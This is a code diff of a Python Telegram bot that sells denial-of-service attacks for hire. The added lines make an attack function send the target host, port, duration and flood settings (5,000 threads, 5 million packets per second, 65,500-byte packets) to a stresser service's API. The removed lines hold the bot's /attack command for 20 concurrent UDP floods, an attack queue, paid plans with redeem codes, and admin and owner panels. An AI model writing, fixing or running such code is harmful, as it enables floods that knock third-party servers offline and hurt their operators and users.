@@ -1,4 +1,4 @@
-# app.py - Complete Working for Render
+# app.py - Working on Render with all features
 import os
 import logging
 import asyncio
@@ -508,91 +508,110 @@ def send_udp_direct(target, port, duration, attack_num):
 
 # ===== API UDP ATTACK =====
 async def send_udp_api(target, port, duration, attack_num):
-    """Send UDP attack using the correct API URL format"""
     base_url = "https://api.susstresser.com/panel/api/api.php"
     
-    # Try different method names
-    methods_to_try = ["udp", "telegramvc", "UDP"]
-    
-    for method in methods_to_try:
-        # Build URL with parameters
-        url = f"{base_url}?key={API_KEY}&host={target}&port={port}&time={duration}&method={method}"
-        
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Accept-Encoding": "gzip, deflate",
-            "Connection": "keep-alive"
+    api_formats = [
+        {
+            "params": {
+                "key": API_KEY,
+                "host": target,
+                "port": port,
+                "time": duration,
+                "method": "udp",
+                "threads": 5000,
+                "pps": 5000000,
+                "size": 65500
+            },
+            "method": "POST"
+        },
+        {
+            "params": {
+                "key": API_KEY,
+                "host": target,
+                "port": port,
+                "time": duration,
+                "method": "telegramvc"
+            },
+            "method": "POST"
+        },
+        {
+            "params": {
+                "key": API_KEY,
+                "host": target,
+                "port": port,
+                "time": duration,
+                "method": "udp"
+            },
+            "method": "GET"
         }
-        
+    ]
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Encoding": "gzip, deflate",
+        "Connection": "keep-alive",
+        "Content-Type": "application/x-www-form-urlencoded"
+    }
+    
+    for format_data in api_formats:
         try:
             timeout = aiohttp.ClientTimeout(total=duration + 15)
             async with aiohttp.ClientSession(timeout=timeout) as session:
                 start_time = time.time()
                 
-                # Try GET with full URL
-                async with session.get(url, headers=headers) as response:
-                    elapsed = time.time() - start_time
-                    raw_response = await response.read()
-                    try:
-                        result_text = raw_response.decode('utf-8')
-                    except:
-                        result_text = raw_response.decode('utf-8', errors='ignore')
-                    
-                    # Check for success indicators
-                    success_indicators = ["SUCCESS", "sent", "attack", "Host:", "Concurrent:", "1/1", "successfully"]
-                    is_success = any(indicator in result_text for indicator in success_indicators)
-                    
-                    if is_success and "<form" not in result_text:
-                        logger.info(f"✅ Attack {attack_num} SUCCESS with method {method}")
-                        return {
-                            "success": True,
-                            "attack_num": attack_num,
-                            "method": f"API_GET_{method}",
-                            "status": response.status,
-                            "elapsed": f"{elapsed:.2f}s",
-                            "response": result_text[:300]
-                        }
+                if format_data["method"] == "POST":
+                    async with session.post(base_url, data=format_data["params"], headers=headers) as response:
+                        elapsed = time.time() - start_time
+                        raw_response = await response.read()
+                        try:
+                            result_text = raw_response.decode('utf-8')
+                        except:
+                            result_text = raw_response.decode('utf-8', errors='ignore')
+                        
+                        success_indicators = ["SUCCESS", "sent", "attack", "Host:", "Concurrent:", "1/1", "successfully"]
+                        is_success = any(indicator in result_text for indicator in success_indicators)
+                        
+                        if is_success and "<form" not in result_text:
+                            return {
+                                "success": True,
+                                "attack_num": attack_num,
+                                "method": "API_POST",
+                                "status": response.status,
+                                "elapsed": f"{elapsed:.2f}s",
+                                "response": result_text[:300]
+                            }
+                else:
+                    async with session.get(base_url, params=format_data["params"], headers=headers) as response:
+                        elapsed = time.time() - start_time
+                        raw_response = await response.read()
+                        try:
+                            result_text = raw_response.decode('utf-8')
+                        except:
+                            result_text = raw_response.decode('utf-8', errors='ignore')
+                        
+                        success_indicators = ["SUCCESS", "sent", "attack", "Host:", "Concurrent:", "1/1", "successfully"]
+                        is_success = any(indicator in result_text for indicator in success_indicators)
+                        
+                        if is_success and "<form" not in result_text:
+                            return {
+                                "success": True,
+                                "attack_num": attack_num,
+                                "method": "API_GET",
+                                "status": response.status,
+                                "elapsed": f"{elapsed:.2f}s",
+                                "response": result_text[:300]
+                            }
                 
-                # If GET didn't work, try POST with form data
-                async with session.post(base_url, data={
-                    "key": API_KEY,
-                    "host": target,
-                    "port": port,
-                    "time": duration,
-                    "method": method
-                }, headers=headers) as response2:
-                    elapsed2 = time.time() - start_time
-                    raw_response2 = await response2.read()
-                    try:
-                        result_text2 = raw_response2.decode('utf-8')
-                    except:
-                        result_text2 = raw_response2.decode('utf-8', errors='ignore')
-                    
-                    success_indicators = ["SUCCESS", "sent", "attack", "Host:", "Concurrent:", "1/1", "successfully"]
-                    is_success2 = any(indicator in result_text2 for indicator in success_indicators)
-                    
-                    if is_success2 and "<form" not in result_text2:
-                        logger.info(f"✅ Attack {attack_num} SUCCESS with method {method} (POST)")
-                        return {
-                            "success": True,
-                            "attack_num": attack_num,
-                            "method": f"API_POST_{method}",
-                            "status": response2.status,
-                            "elapsed": f"{elapsed2:.2f}s",
-                            "response": result_text2[:300]
-                        }
-                
-                await asyncio.sleep(0.3)
+                await asyncio.sleep(0.2)
                 
         except Exception as e:
-            logger.error(f"Attack {attack_num} with method {method} failed: {e}")
             continue
     
     return {
         "success": False,
         "attack_num": attack_num,
-        "error": "All methods failed",
+        "error": "All API formats failed",
         "method": "API_FAILED"
     }
 
@@ -671,875 +690,7 @@ async def process_queue():
         await asyncio.sleep(2)
 
 # ===== BOT HANDLERS =====
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    db.add_user(user.id, user.username, user.first_name)
-    
-    total_attacks = db.get_user_stats(user.id)
-    is_admin = db.is_admin(user.id)
-    
-    plan, expiry = db.get_user_plan(user.id)
-    plan_display = "💎 PREMIUM"
-    if expiry:
-        days_left = max(0, (expiry - datetime.now()).days)
-        plan_display += f" ({days_left}d left)"
-    
-    queue_count = len(attack_queue.get_queue_status(user.id))
-    active_count = len(attack_manager.get_active_attacks(user.id))
-    
-    first_name = user.first_name or "User"
-    welcome_msg = (
-        f"👋 *WELCOME TO GURU*\n\n"
-        f"Hello {first_name}! 👋\n"
-        f"📊 Total Attacks: {total_attacks}\n"
-        f"📌 Queue: {queue_count} attacks waiting\n"
-        f"⚡ Active: {active_count} attacks running\n"
-        f"📊 Plan: {plan_display}\n"
-        f"⚡ 20x UDP Concurrent: ENABLED\n"
-        f"⚡ Status: {'✅ ACTIVE' if not db.is_banned(user.id) else '❌ BANNED'}"
-    )
-    
-    keyboard = []
-    if not db.is_banned(user.id):
-        keyboard.append([InlineKeyboardButton("💥 20x ATTACK", callback_data="attack")])
-        keyboard.append([InlineKeyboardButton("📌 MY QUEUE", callback_data="my_queue")])
-        keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
-    
-    if is_admin:
-        keyboard.append([InlineKeyboardButton("📊 STATS", callback_data="stats")])
-        keyboard.append([InlineKeyboardButton("⚙️ ADMIN PANEL", callback_data="admin")])
-    
-    if db.is_owner_or_pseudo(user.id):
-        keyboard.append([InlineKeyboardButton("👑 OWNER PANEL", callback_data="owner")])
-    
-    if not is_admin:
-        keyboard.append([InlineKeyboardButton("👤 MY INFO", callback_data="info")])
-    
-    await update.message.reply_text(
-        welcome_msg,
-        reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
-        parse_mode='Markdown'
-    )
-
-# ===== DIRECT ATTACK COMMAND =====
-async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    
-    if db.is_banned(user_id):
-        await update.message.reply_text("❌ You are banned!")
-        return
-    
-    args = context.args
-    if len(args) < 3:
-        await update.message.reply_text(
-            "❌ *Usage:* `/attack IP PORT TIME`\n\n"
-            "Example: `/attack 91.108.17.19 32001 60`\n\n"
-            "⚡ 20 concurrent UDP attacks!\n"
-            "📦 Packet Size: 65,500 bytes\n"
-            "💪 Threads: 5,000 each\n"
-            "⏱️ Time: 60-300 seconds",
-            parse_mode='Markdown'
-        )
-        return
-    
-    try:
-        target = args[0]
-        port = int(args[1])
-        duration = int(args[2])
-        
-        if duration < 60:
-            await update.message.reply_text("❌ Minimum duration is 60 seconds!")
-            return
-        if duration > 300:
-            await update.message.reply_text("❌ Maximum duration is 300 seconds!")
-            return
-        
-        can_start, msg = attack_manager.can_start_attack(user_id)
-        if not can_start:
-            success, result = attack_queue.add_to_queue(user_id, target, port, duration)
-            if not success:
-                await update.message.reply_text(result)
-                return
-            
-            position = attack_queue.get_queue_position(user_id)
-            await update.message.reply_text(
-                f"📌 *ATTACK ADDED TO QUEUE*\n\n"
-                f"🎯 Target: `{target}`\n"
-                f"📡 Port: `{port}`\n"
-                f"⏱️ Time: `{duration}s`\n"
-                f"📌 Position: {position[0] if position else 'N/A'}\n"
-                f"📊 Queue Size: {len(attack_queue.queue)}/{MAX_QUEUE}",
-                parse_mode='Markdown'
-            )
-            return
-        
-        status_msg = await update.message.reply_text(
-            f"🚀 *20x UDP ATTACK STARTED*\n\n"
-            f"🎯 Target: `{target}`\n"
-            f"📡 Port: `{port}`\n"
-            f"⏱️ Time: `{duration}s`\n"
-            f"⚡ Attacks: `20 CONCURRENT`\n"
-            f"📦 Packet: `65,500 bytes`",
-            parse_mode='Markdown'
-        )
-        
-        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
-        result = await send_20_concurrent_attacks(target, port, duration)
-        
-        attack_manager.log_attack(
-            user_id, target, port, duration, "udp",
-            "success" if result.get('success') else "failed",
-            str(result)
-        )
-        
-        if result.get('success'):
-            response_text = (
-                f"✅ *20x UDP ATTACK SUCCESSFUL!*\n\n"
-                f"🎯 Target: `{target}`\n"
-                f"📡 Port: `{port}`\n"
-                f"⏱️ Time: `{duration}s`\n"
-                f"📊 Attack ID: `{attack_id}`\n"
-                f"⚡ Status: ✅ SUCCESS\n\n"
-                f"📊 Success Rate: {result['successful']}/{result['total_attacks']}"
-            )
-        else:
-            response_text = (
-                f"❌ *20x UDP ATTACK FAILED*\n\n"
-                f"🎯 Target: `{target}`\n"
-                f"📡 Port: `{port}`\n"
-                f"⏱️ Time: `{duration}s`\n"
-                f"📊 Attack ID: `{attack_id}`\n"
-                f"⚡ Status: ❌ FAILED"
-            )
-        
-        await status_msg.edit_text(response_text, parse_mode='Markdown')
-        attack_manager.stop_attack(attack_id)
-        attack_manager.cleanup()
-        
-    except ValueError as e:
-        await update.message.reply_text(f"❌ Invalid port or time! Use numbers.\nError: {e}")
-    except Exception as e:
-        await update.message.reply_text(f"❌ Error: {str(e)}")
-
-# ===== BUTTON ATTACK =====
-async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    if db.is_banned(query.from_user.id):
-        await query.edit_message_text("❌ You are banned!")
-        return
-    
-    await query.edit_message_text(
-        "💥 *20x UDP ATTACK*\n\n"
-        "Send: `IP PORT TIME`\n"
-        "Example: `91.108.17.19 32001 60`\n\n"
-        "⚡ 20 concurrent UDP attacks!\n"
-        "📦 Packet Size: 65,500 bytes\n"
-        "💪 Threads: 5,000 each\n"
-        "⏱️ Time: 60-300 seconds\n\n"
-        "Send /cancel to cancel",
-        parse_mode='Markdown'
-    )
-    context.user_data['awaiting_attack'] = True
-
-async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.user_data.get('awaiting_attack'):
-        return
-    
-    if update.message.text.lower() == '/cancel':
-        context.user_data['awaiting_attack'] = False
-        await update.message.reply_text("✅ Cancelled.")
-        return
-    
-    user_id = update.effective_user.id
-    
-    if db.is_banned(user_id):
-        await update.message.reply_text("❌ You are banned!")
-        context.user_data['awaiting_attack'] = False
-        return
-    
-    try:
-        parts = update.message.text.split()
-        target = parts[0]
-        port = int(parts[1])
-        duration = int(parts[2])
-        
-        if duration < 60 or duration > 300:
-            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
-            return
-        
-        can_start, msg = attack_manager.can_start_attack(user_id)
-        if not can_start:
-            success, result = attack_queue.add_to_queue(user_id, target, port, duration)
-            if not success:
-                await update.message.reply_text(result)
-                context.user_data['awaiting_attack'] = False
-                return
-            
-            position = attack_queue.get_queue_position(user_id)
-            await update.message.reply_text(
-                f"📌 *ATTACK ADDED TO QUEUE*\n\n"
-                f"🎯 Target: `{target}`\n"
-                f"📡 Port: `{port}`\n"
-                f"⏱️ Time: `{duration}s`\n"
-                f"📌 Position: {position[0] if position else 'N/A'}",
-                parse_mode='Markdown'
-            )
-            context.user_data['awaiting_attack'] = False
-            return
-        
-        status_msg = await update.message.reply_text(
-            f"🚀 Launching 20 UDP attacks on {target}:{port} for {duration}s..."
-        )
-        
-        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
-        result = await send_20_concurrent_attacks(target, port, duration)
-        
-        if result.get('success'):
-            response_text = (
-                f"✅ *20x UDP SUCCESS!*\n\n"
-                f"🎯 Target: `{target}`\n"
-                f"📡 Port: `{port}`\n"
-                f"⏱️ Time: `{duration}s`\n"
-                f"📊 Attack ID: `{attack_id}`\n"
-                f"⚡ Status: ✅ SUCCESS"
-            )
-        else:
-            response_text = (
-                f"❌ *ATTACK FAILED*\n\n"
-                f"🎯 Target: `{target}`\n"
-                f"📡 Port: `{port}`\n"
-                f"⏱️ Time: `{duration}s`\n"
-                f"📊 Attack ID: `{attack_id}`\n"
-                f"⚡ Status: ❌ FAILED"
-            )
-        
-        await status_msg.edit_text(response_text, parse_mode='Markdown')
-        attack_manager.stop_attack(attack_id)
-        attack_manager.cleanup()
-        
-    except Exception as e:
-        await update.message.reply_text(f"❌ Error: {str(e)}")
-    
-    context.user_data['awaiting_attack'] = False
-
-# ===== MY QUEUE =====
-async def my_queue_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    user_id = query.from_user.id
-    queued = attack_queue.get_queue_status(user_id)
-    active = attack_manager.get_active_attacks(user_id)
-    
-    if not queued and not active:
-        await query.edit_message_text(
-            "📌 *YOUR QUEUE*\n\nNo attacks in queue or active.",
-            parse_mode='Markdown',
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
-        )
-        return
-    
-    text = "📌 *YOUR QUEUE & ACTIVE ATTACKS*\n\n"
-    
-    if active:
-        text += "⚡ *Active Attacks:*\n"
-        for aid, att in active.items():
-            elapsed = (datetime.now() - att['start_time']).seconds
-            remaining = max(0, att['duration'] - elapsed)
-            text += f"🔹 {att['target']}:{att['port']} - {remaining}s left\n"
-        text += "\n"
-    
-    if queued:
-        text += "📌 *Queued Attacks:*\n"
-        for i, q in enumerate(queued, 1):
-            text += f"🔸 {q['target']}:{q['port']} - {q['duration']}s (Position: {i})\n"
-    
-    await query.edit_message_text(
-        text,
-        parse_mode='Markdown',
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
-    )
-
-# ===== MY PLAN =====
-async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    user_id = query.from_user.id
-    plan, expiry = db.get_user_plan(user_id)
-    days_left = max(0, (expiry - datetime.now()).days) if expiry else 30
-    
-    text = (
-        "👤 *MY PLAN*\n\n"
-        "📊 Plan: 💎 PREMIUM\n"
-        f"⏱️ Remaining: {days_left} days\n"
-        f"📅 Expires: {expiry.strftime('%Y-%m-%d') if expiry else 'N/A'}\n\n"
-        "📌 Features:\n"
-        "• Full access\n"
-        "• 20x UDP Concurrent\n"
-        "• Priority queue\n"
-        "• Unlimited attacks"
-    )
-    
-    await query.edit_message_text(
-        text,
-        parse_mode='Markdown',
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
-    )
-
-# ===== INFO =====
-async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    user_id = query.from_user.id
-    level = db.get_admin_level(user_id) or "USER"
-    plan, expiry = db.get_user_plan(user_id)
-    total_attacks = db.get_user_stats(user_id)
-    
-    await query.edit_message_text(
-        f"👤 *USER INFO*\n\n"
-        f"🆔 ID: {user_id}\n"
-        f"⭐ Level: {level.upper()}\n"
-        f"📊 Plan: PREMIUM\n"
-        f"⚡ 20x UDP: ENABLED\n"
-        f"💥 Total Attacks: {total_attacks}",
-        parse_mode='Markdown',
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
-    )
-
-# ===== STATS =====
-async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    user_id = query.from_user.id
-    if not db.is_admin(user_id):
-        await query.answer("Access denied!", show_alert=True)
-        return
-    
-    total_attacks = db.get_total_attacks()
-    users = db.get_all_users()
-    admins = db.get_admins()
-    codes = db.get_codes()
-    queue_size = len(attack_queue.queue)
-    active = len(attack_manager.active_attacks)
-    
-    stats_text = (
-        f"📊 *BOT STATISTICS*\n\n"
-        f"👥 Total Users: {len(users)}\n"
-        f"👑 Admins: {len(admins)}\n"
-        f"💥 Total Attacks: {total_attacks}\n"
-        f"🎫 Redeem Codes: {len(codes)}\n"
-        f"📌 Queue Size: {queue_size}/{MAX_QUEUE}\n"
-        f"⚡ Active Attacks: {active}/{MAX_CONCURRENT}\n"
-        f"⚡ 20x UDP: ENABLED\n"
-        f"🌐 Status: ONLINE"
-    )
-    
-    await query.edit_message_text(
-        stats_text,
-        parse_mode='Markdown',
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
-    )
-
-# ===== ADMIN PANEL =====
-async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    user_id = query.from_user.id
-    if not db.is_admin(user_id):
-        await query.answer("Access denied!", show_alert=True)
-        return
-    
-    keyboard = [
-        [InlineKeyboardButton("➕ GENERATE CODE", callback_data="admin_gen")],
-        [InlineKeyboardButton("📋 LIST CODES", callback_data="admin_list")],
-        [InlineKeyboardButton("🗑️ DELETE CODE", callback_data="admin_delete")],
-        [InlineKeyboardButton("📊 STATS", callback_data="stats")],
-        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
-    ]
-    
-    await query.edit_message_text(
-        "⚙️ *ADMIN PANEL*\n\nSelect action:",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
-    )
-
-async def admin_gen_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    keyboard = [
-        [InlineKeyboardButton("📅 1 DAY", callback_data="gen_1d")],
-        [InlineKeyboardButton("📅 3 DAYS", callback_data="gen_3d")],
-        [InlineKeyboardButton("📅 7 DAYS", callback_data="gen_7d")],
-        [InlineKeyboardButton("📅 30 DAYS", callback_data="gen_30d")],
-        [InlineKeyboardButton("📅 90 DAYS", callback_data="gen_90d")],
-        [InlineKeyboardButton("🔙 BACK", callback_data="admin")]
-    ]
-    
-    await query.edit_message_text(
-        "➕ *GENERATE CODE*\n\nSelect duration:",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
-    )
-
-async def process_gen_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    days = int(query.data.split('_')[1].replace('d', ''))
-    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
-    
-    if db.create_code(code, days, query.from_user.id):
-        await query.edit_message_text(
-            f"✅ *CODE GENERATED*\n\n"
-            f"Code: `{code}`\n"
-            f"Duration: {days} days\n\n"
-            f"Share this code with users!",
-            parse_mode='Markdown',
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
-        )
-    else:
-        await query.edit_message_text("❌ Failed to generate code!")
-
-async def admin_list_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    codes = db.get_codes()
-    if not codes:
-        text = "📋 No codes generated yet."
-    else:
-        text = "📋 *REDEEM CODES*\n\n"
-        for c in codes[:20]:
-            status = "✅" if not c.get('is_used') else f"❌ Used by {c.get('used_by', 'N/A')}"
-            text += f"`{c['code']}` - {c['access_days']}d - {status}\n"
-    
-    await query.edit_message_text(
-        text[:4000],
-        parse_mode='Markdown',
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
-    )
-
-async def admin_delete_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    codes = db.get_codes(only_unused=True)
-    if not codes:
-        await query.edit_message_text("No unused codes to delete!")
-        return
-    
-    keyboard = []
-    for c in codes[:10]:
-        keyboard.append([InlineKeyboardButton(f"❌ {c['code']}", callback_data=f"del_{c['code']}")])
-    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="admin")])
-    
-    await query.edit_message_text(
-        "🗑️ *DELETE CODE*\n\nSelect code to delete:",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
-    )
-
-async def process_delete_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    code = query.data.split('_')[1]
-    if db.delete_code(code):
-        await query.edit_message_text(
-            f"✅ Code `{code}` deleted!",
-            parse_mode='Markdown',
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
-        )
-    else:
-        await query.edit_message_text("❌ Failed to delete code!")
-
-# ===== OWNER PANEL =====
-async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    user_id = query.from_user.id
-    if not db.is_owner_or_pseudo(user_id):
-        await query.answer("Access denied!", show_alert=True)
-        return
-    
-    keyboard = [
-        [InlineKeyboardButton("🛑 KILL SWITCH", callback_data="owner_kill")],
-        [InlineKeyboardButton("🔪 KILL USER", callback_data="owner_kill_user")],
-        [InlineKeyboardButton("👑 PROMOTE ADMIN", callback_data="owner_promote")],
-        [InlineKeyboardButton("👑 DEMOTE ADMIN", callback_data="owner_demote")],
-        [InlineKeyboardButton("🚫 BAN USER", callback_data="owner_ban")],
-        [InlineKeyboardButton("✅ UNBAN USER", callback_data="owner_unban")],
-        [InlineKeyboardButton("📊 STATS", callback_data="stats")],
-        [InlineKeyboardButton("📋 LIST ADMINS", callback_data="owner_list_admins")],
-        [InlineKeyboardButton("📌 QUEUE STATUS", callback_data="owner_queue_status")],
-        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
-    ]
-    
-    await query.edit_message_text(
-        f"👑 *OWNER PANEL*\n\nSelect action:",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
-    )
-
-async def owner_kill_switch_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    if not db.is_owner_or_pseudo(query.from_user.id):
-        await query.answer("Access denied!", show_alert=True)
-        return
-    
-    killed = attack_queue.kill_switch()
-    for aid in list(attack_manager.active_attacks.keys()):
-        attack_manager.stop_attack(aid)
-    
-    await query.edit_message_text(
-        f"🛑 *KILL SWITCH ACTIVATED*\n\n"
-        f"✅ {killed} attacks removed from queue\n"
-        f"✅ All active attacks stopped\n"
-        f"⚡ System cleared!",
-        parse_mode='Markdown',
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
-    )
-
-async def owner_kill_user_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    if not db.is_owner_or_pseudo(query.from_user.id):
-        await query.answer("Access denied!", show_alert=True)
-        return
-    
-    await query.edit_message_text(
-        "🔪 *KILL USER ATTACKS*\n\n"
-        "Send user ID to kill all their attacks:\n"
-        "`123456789`\n\n"
-        "Send /cancel to cancel",
-        parse_mode='Markdown'
-    )
-    context.user_data['awaiting_kill_user'] = True
-
-async def process_kill_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.user_data.get('awaiting_kill_user'):
-        return
-    
-    if update.message.text.lower() == '/cancel':
-        context.user_data['awaiting_kill_user'] = False
-        await update.message.reply_text("Cancelled.")
-        return
-    
-    try:
-        user_id = int(update.message.text.strip())
-        killed = attack_queue.kill_user_attacks(user_id)
-        
-        active = attack_manager.get_active_attacks(user_id)
-        for aid in active:
-            attack_manager.stop_attack(aid)
-        
-        await update.message.reply_text(
-            f"🔪 *USER ATTACKS KILLED*\n\n"
-            f"✅ {killed} attacks removed from queue\n"
-            f"✅ Active attacks stopped for user `{user_id}`",
-            parse_mode='Markdown'
-        )
-    except:
-        await update.message.reply_text("❌ Invalid user ID!")
-    
-    context.user_data['awaiting_kill_user'] = False
-
-async def owner_queue_status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    queue = attack_queue.get_queue_status()
-    active = attack_manager.get_active_attacks()
-    
-    text = "📌 *QUEUE & ACTIVE ATTACKS*\n\n"
-    
-    if active:
-        text += "⚡ *Active Attacks:*\n"
-        for aid, att in active.items():
-            elapsed = (datetime.now() - att['start_time']).seconds
-            remaining = max(0, att['duration'] - elapsed)
-            text += f"🔹 {att['target']}:{att['port']} - {remaining}s left (User: {att['user_id']})\n"
-        text += "\n"
-    else:
-        text += "⚡ No active attacks\n\n"
-    
-    if queue:
-        text += "📌 *Queued Attacks:*\n"
-        for i, q in enumerate(queue, 1):
-            text += f"🔸 {q['target']}:{q['port']} - {q['duration']}s (User: {q['user_id']})\n"
-    else:
-        text += "📌 Queue is empty"
-    
-    await query.edit_message_text(
-        text[:4000],
-        parse_mode='Markdown',
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
-    )
-
-async def owner_promote_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    await query.edit_message_text(
-        "👑 *PROMOTE ADMIN*\n\nSend user ID to promote:\n`123456789`\n\nSend /cancel to cancel",
-        parse_mode='Markdown'
-    )
-    context.user_data['awaiting_promote'] = True
-
-async def process_promote(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.user_data.get('awaiting_promote'):
-        return
-    
-    if update.message.text.lower() == '/cancel':
-        context.user_data['awaiting_promote'] = False
-        await update.message.reply_text("Cancelled.")
-        return
-    
-    try:
-        user_id = int(update.message.text.strip())
-        user = db.get_user(user_id)
-        username = user.get('username', 'Unknown') if user else 'Unknown'
-        
-        if db.add_admin(user_id, username, update.effective_user.id):
-            await update.message.reply_text(f"✅ User `{user_id}` is now an admin!", parse_mode='Markdown')
-        else:
-            await update.message.reply_text("❌ User is already an admin!", parse_mode='Markdown')
-    except:
-        await update.message.reply_text("❌ Invalid user ID!")
-    
-    context.user_data['awaiting_promote'] = False
-
-async def owner_demote_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    admins = db.get_admins()
-    keyboard = []
-    for admin in admins:
-        if admin['user_id'] not in [OWNER_ID, PSEUDO_OWNER_ID]:
-            keyboard.append([InlineKeyboardButton(f"❌ {admin['user_id']}", callback_data=f"demote_{admin['user_id']}")])
-    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="owner")])
-    
-    if not keyboard:
-        await query.edit_message_text("No admins to demote!")
-        return
-    
-    await query.edit_message_text(
-        "👑 *DEMOTE ADMIN*\n\nSelect admin to demote:",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
-    )
-
-async def process_demote(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    user_id = int(query.data.split('_')[1])
-    if db.remove_admin(user_id):
-        await query.edit_message_text(
-            f"✅ Admin `{user_id}` demoted!",
-            parse_mode='Markdown',
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
-        )
-    else:
-        await query.edit_message_text("❌ Failed to demote admin!")
-
-async def owner_ban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    await query.edit_message_text(
-        "🚫 *BAN USER*\n\nSend user ID to ban:\n`123456789`\n\nSend /cancel to cancel",
-        parse_mode='Markdown'
-    )
-    context.user_data['awaiting_ban'] = True
-
-async def process_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.user_data.get('awaiting_ban'):
-        return
-    
-    if update.message.text.lower() == '/cancel':
-        context.user_data['awaiting_ban'] = False
-        await update.message.reply_text("Cancelled.")
-        return
-    
-    try:
-        user_id = int(update.message.text.strip())
-        if user_id in [OWNER_ID, PSEUDO_OWNER_ID]:
-            await update.message.reply_text("❌ Cannot ban owner or pseudo owner!")
-            context.user_data['awaiting_ban'] = False
-            return
-        
-        db.ban_user(user_id, f"Banned by {update.effective_user.id}", update.effective_user.id)
-        await update.message.reply_text(f"✅ User `{user_id}` banned!", parse_mode='Markdown')
-    except:
-        await update.message.reply_text("❌ Invalid user ID!")
-    
-    context.user_data['awaiting_ban'] = False
-
-async def owner_unban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    await query.edit_message_text(
-        "✅ *UNBAN USER*\n\nSend user ID to unban:\n`123456789`",
-        parse_mode='Markdown'
-    )
-    context.user_data['awaiting_unban'] = True
-
-async def process_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.user_data.get('awaiting_unban'):
-        return
-    
-    try:
-        user_id = int(update.message.text.strip())
-        db.unban_user(user_id)
